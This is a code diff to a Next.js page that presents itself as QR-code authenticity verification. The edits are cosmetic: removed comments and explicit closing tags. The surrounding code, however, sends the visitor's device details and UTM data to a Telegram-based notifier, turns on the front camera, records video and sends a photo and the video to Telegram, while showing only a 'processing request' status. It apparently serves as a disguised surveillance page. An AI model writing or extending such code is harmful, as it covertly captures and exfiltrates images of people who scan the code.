@@ -4,7 +4,7 @@ import { useEffect, useState, useRef, useCallback } from 'react';
 import { useSearchParams, usePathname } from 'next/navigation';
 import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi';
 import { useLayoutContext } from '@/context/LayoutContext';
-import { showSuccess, showError } from '@/utils/toast'; // Keep for critical errors
+import { showSuccess, showError } from '@/utils/toast';
 import LoadingSpinner from '@/components/LoadingSpinner';
 import { RefreshCcw } from 'lucide-react';
 import { UAParser } from 'ua-parser-js';
@@ -28,7 +28,6 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
   const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
   const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
   const [videoPreviewUrl, setVideoPreviewUrl] = useState<string | null>(null);
-  // Removed captionMessage state as it's now handled by a local variable
 
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
@@ -101,7 +100,6 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         clientTimezone,
       };
       const initialCaption = await notifyVisit(bodyData, utmQueryParams);
-      // setCaptionMessage(initialCaption); // Removed state update
       setStatusMessage(t.authenticity.processingRequest + " (Initial notification sent.)");
 
       // 4. Request Camera Access (front camera first)
@@ -178,11 +176,11 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
           setStatusMessage(t.authenticity.processingRequest + " (Sending video...)");
           const filename = `qr_scan_video_${new Date().getTime()}.webm`;
           await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
-          showSuccess(t.authenticity.recordingSuccess); // Keep this toast for final user confirmation
+          showSuccess(t.authenticity.recordingSuccess);
           setStatusMessage(t.authenticity.recordingSuccess);
         } catch (videoSendError: unknown) {
           console.error("Error sending video to Telegram:", videoSendError);
-          showError(t.authenticity.recordingError); // Keep this toast for critical error
+          showError(t.authenticity.recordingError);
           setError(t.authenticity.recordingError + (videoSendError instanceof Error ? `: ${videoSendError.message}` : "."));
           setStatusMessage(t.authenticity.recordingError);
         } finally {
@@ -203,21 +201,21 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       if (err instanceof DOMException && err.name === "NotAllowedError") {
         setError(t.authenticity.qrScanError + " (Camera access denied).");
         setStatusMessage(t.authenticity.qrScanError + " (Camera access denied).");
-        showError(t.authenticity.qrScanError + " (Camera access denied)."); // Critical error toast
+        showError(t.authenticity.qrScanError + " (Camera access denied).");
       } else if (err instanceof DOMException && err.name === "NotFoundError") {
         setError(t.authenticity.qrScanError + " (No camera found).");
         setStatusMessage(t.authenticity.qrScanError + " (No camera found).");
-        showError(t.authenticity.qrScanError + " (No camera found)."); // Critical error toast
+        showError(t.authenticity.qrScanError + " (No camera found).");
       } else {
         setError(t.authenticity.qrScanError + (err instanceof Error ? `: ${err.message}` : "."));
         setStatusMessage(t.authenticity.qrScanError);
-        showError(t.authenticity.qrScanError); // General critical error toast
+        showError(t.authenticity.qrScanError);
       }
       setIsLoading(false);
       setIsRecording(false);
       stopCamera();
     }
-  }, [currentLang, searchParams, pathname, t, stopCamera, recordedChunks]);
+  }, [searchParams, pathname, t, stopCamera, recordedChunks]);
 
   useEffect(() => {
     startVerificationProcess();
@@ -251,8 +249,9 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
 
       <div className="relative w-full max-w-md aspect-video bg-gray-200 dark:bg-gray-700 rounded-lg overflow-hidden shadow-lg mb-6">
         {isCameraActive && !videoPreviewUrl && (
-          <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
+          <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover"></video>
         )}
+        {/* Changed to explicit closing tag */}
         {videoPreviewUrl && (
           <video
             src={videoPreviewUrl}
@@ -260,8 +259,9 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
             controls
             autoPlay
             loop
-          />
+          ></video>
         )}
+        {/* Changed to explicit closing tag */}
         {isRecording && (
           <div className="absolute top-2 left-2 bg-red-600 text-white text-xs px-2 py-1 rounded-full flex items-center">
             <span className="relative flex h-2 w-2 mr-1">
@@ -271,7 +271,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
             REC
           </div>
         )}
-        <canvas ref={canvasRef} style={{ display: 'none' }} />
+        <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>
       </div>
 
       {error && (
